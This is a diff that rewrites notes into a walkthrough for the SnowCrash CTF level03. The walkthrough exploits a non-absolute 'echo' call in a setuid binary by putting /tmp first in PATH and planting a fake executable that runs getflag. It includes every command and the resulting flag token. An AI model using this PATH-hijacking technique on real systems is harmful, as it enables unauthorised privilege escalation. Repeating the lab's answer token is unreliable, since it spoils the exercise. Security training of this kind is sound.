@@ -1,27 +1,54 @@
-Command strings on level03 shows that the command /usr/bin/env echo "Exploit me" is run inside the program
-we can take advantage of the non absolute path to run another command like getflag at the first location in the $PATH
+# Level03
 
-1) add /tmp to $PATH with : $export PATH=/tmp:$PATH
+## Objective
+Exploit the non-absolute path in the `level03` program to execute the `getflag` command and retrieve the flag.
 
-2) place a fake echo containing getflag in /tmp : $echo "getflag" > /tmp/echo
+## Steps
 
-3) add execution rights : $chmod +x /tmp/echo
+### Step 1: Identify Vulnerability
+Use the `strings` command on `level03` to identify the command being executed:
 
-4) execute ./level03
+```bash
+strings level03 | grep Exploit
+```
 
-getflag executed from /tmp gives the flag
-
-
-doc : https://systemweakness.com/linux-privilege-escalation-using-path-variable-manipulation-64325ab05469
-
-
-level03@SnowCrash:~$ ./level03 
-Exploit me
-level03@SnowCrash:~$ strings level03 | grep Exploit
+Result:
+```plaintext
 /usr/bin/env echo Exploit me
-level03@SnowCrash:~$ echo "getflag"> /tmp/echo
-level03@SnowCrash:~$ chmod +x /tmp/echo
-level03@SnowCrash:~$ export PATH=/tmp/:$PATH
-level03@SnowCrash:~$ ./level03 
-Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
-level03@SnowCrash:~$ 
+```
+
+### Step 2: Manipulate PATH
+Add `/tmp` to the beginning of the `$PATH` environment variable:
+
+```bash
+export PATH=/tmp:$PATH
+```
+
+### Step 3: Create Fake `echo` Command
+Create a fake `echo` command in `/tmp` that contains the `getflag` command:
+
+```bash
+echo "getflag" > /tmp/echo
+```
+
+### Step 4: Provide Execution Rights
+Give execution rights to the fake `echo` command:
+
+```bash
+chmod +x /tmp/echo
+```
+
+### Step 5: Execute `level03`
+Run `./level03` to execute the manipulated command:
+
+```bash
+./level03
+```
+
+You should see the flag:
+
+```plaintext
+Check flag. Here is your token: qi0maab88jeaj46qoumi7maus
+```
+
+Congratulations! You've successfully exploited the vulnerability in `level03` and obtained the flag.
